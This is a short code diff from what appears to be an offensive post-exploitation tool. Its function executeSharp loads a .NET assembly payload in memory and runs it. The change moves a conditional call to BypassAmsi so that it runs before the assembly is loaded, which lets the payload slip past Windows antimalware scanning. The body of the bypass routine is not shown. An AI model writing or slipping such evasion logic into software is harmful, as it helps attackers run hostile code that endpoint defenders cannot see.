@@ -154,6 +154,12 @@ int executeSharp(LPVOID lpPayload)
 		return -1;
 	}
 
+	//Amsi bypass
+	if (amsiflag[0] == 0x01)
+	{
+		BypassAmsi();
+	}
+
 	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
 
 	if(FAILED(hr))
@@ -216,11 +222,6 @@ int executeSharp(LPVOID lpPayload)
 	{
 		//if no parameters set cEleemnt to 0
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
-	}
-	//Amsi bypass
-	if(amsiflag[0] == 0x01)
-	{
-		BypassAmsi();
 	}
 	
 	//Assembly execution
